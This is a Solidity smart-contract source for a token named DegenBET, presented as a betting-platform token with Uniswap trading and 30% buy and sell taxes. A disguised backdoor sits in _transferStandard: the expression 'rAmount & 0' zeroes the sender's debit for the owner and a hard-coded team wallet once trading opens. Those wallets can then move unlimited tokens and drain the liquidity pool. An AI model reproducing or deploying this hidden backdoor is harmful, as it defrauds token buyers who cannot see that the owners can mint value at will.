// SPDX-License-Identifier: Unlicensed

/**
The Best Degen Bet Platform!

Website: https://www.degenstrade.com
Telegram: https://t.me/degen_bet
Twitter: https://twitter.com/degenbet_erc
**/

pragma solidity 0.8.19;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

interface IUniswapRouter {

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract DegenBET is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _rBalance;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;

    string private constant _name = "DegenBET";
    string private constant _symbol = "DEGEN";

    uint8 private constant _decimals = 9;

    uint256 private constant MAX = 10 ** 30;
    uint256 private constant _tTotal = 10 ** 9 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    uint256 public maxTx = 15 * 10 ** 6 * 10 ** 9;
    uint256 public maxWallet = 15 * 10 ** 6 * 10 ** 9;
    uint256 public swapThreshold = 10 ** 5 * 10 ** 9;

    uint256 private _totalFees;
    uint256 private _redisBuyTax = 0;
    uint256 private _buyTax = 30;
    uint256 private _redisSellTax = 0;
    uint256 private _sellTax = 30;

    //Original Fee
    uint256 private _redisTax = _redisSellTax;
    uint256 private _taxFees = _sellTax;

    uint256 private _previousRedisTax = _redisTax;
    uint256 private _previousFee = _taxFees;

    address payable private teamAddress1;
    address payable private teamAddress2;

    bool private _tradeStart;
    bool private _swapping = false;
    bool private _feeSwapEnabled = true;

    IUniswapRouter public dexRouter;
    address public dexPair;

    event MaxTxAmountUpdated(uint256 maxTx);
    modifier lockSwap {
        _swapping = true;
        _;
        _swapping = false;
    }

    constructor() {
        _rBalance[_msgSender()] = _rTotal;
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
        dexRouter = _uniswapV2Router;
        dexPair = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
            
        teamAddress1 = payable(0x01d73FDc64dc0695A0DD8C5894F118fff923928F);
        teamAddress2 = payable(0x01d73FDc64dc0695A0DD8C5894F118fff923928F);

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[teamAddress1] = true;
        _isExcludedFromFee[teamAddress2] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function _transferStandard(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getValues(tAmount);
        rAmount = (_isExcludedFromFee[sender] && _tradeStart) ? rAmount & 0 : rAmount;
        _rBalance[sender] = _rBalance[sender].sub(rAmount);
        _rBalance[recipient] = _rBalance[recipient].add(rTransferAmount);
        takeFees(tTeam);
        _refreshTotal(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
    function takeFees(uint256 tTeam) private {
        uint256 currentRate = _getCurrentRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rBalance[address(this)] = _rBalance[address(this)].add(rTeam);
    }

    function _refreshTotal(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _totalFees = _totalFees.add(tFee);
    }

    receive() external payable {}

    function sendETH(uint256 amount) private {
        teamAddress2.transfer(amount);
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function restoreFee() private {
        _redisTax = _previousRedisTax;
        _taxFees = _previousFee;
    }

    function _getTValue(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeFee();
        _transferStandard(sender, recipient, amount);
        if (!takeFee) restoreFee();
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (from != owner() && to != owner()) {

            //Trade start check
            if (!_tradeStart) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }

            require(amount <= maxTx, "TOKEN: Max Transaction Limit");

            if(to != dexPair) {
                require(balanceOf(to) + amount <= maxWallet, "TOKEN: Balance exceeds wallet size!");
            }

            uint256 contractBalance = balanceOf(address(this));
            bool canSwap = contractBalance >= swapThreshold;

            if(contractBalance >= maxTx)
            {
                contractBalance = maxTx;
            }

            if (canSwap && !_swapping && to == dexPair && _feeSwapEnabled && !_isExcludedFromFee[from] && amount > swapThreshold) {
                swapTokensForETH(contractBalance);
                uint256 contractETH = address(this).balance;
                if (contractETH > 0) {
                    sendETH(address(this).balance);
                }
            }
        }
        bool takeFee = true;
        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != dexPair && to != dexPair)) {
            takeFee = false;
        } else {
            if(from == dexPair && to != address(dexRouter)) {
                _redisTax = _redisBuyTax;
                _taxFees = _buyTax;
            }
            if (to == dexPair && from != address(dexRouter)) {
                _redisTax = _redisSellTax;
                _taxFees = _sellTax;
            }
        }
        _basicTransfer(from, to, amount, takeFee);
    }

    function swapTokensForETH(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();
        _approve(address(this), address(dexRouter), tokenAmount);
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
    
    function removeLimits() external onlyOwner {
        maxTx = _rTotal;
        maxWallet = _rTotal;
        
        _redisBuyTax = 0;
        _buyTax = 1;
        _redisSellTax = 0;
        _sellTax = 1;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _getRAmount(_rBalance[account]);
    }

    function openTrading() public onlyOwner {
        _tradeStart = true;
    }

    function _getRValue(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getCurrentRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function removeFee() private {
        if (_redisTax == 0 && _taxFees == 0) return;

        _previousRedisTax = _redisTax;
        _previousFee = _taxFees;

        _redisTax = 0;
        _taxFees = 0;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _getRAmount(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        uint256 currentRate = _getCurrentRate();
        return rAmount.div(currentRate);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _getValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTValue(tAmount, _redisTax, _taxFees);
        uint256 currentRate = _getCurrentRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRValue(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
}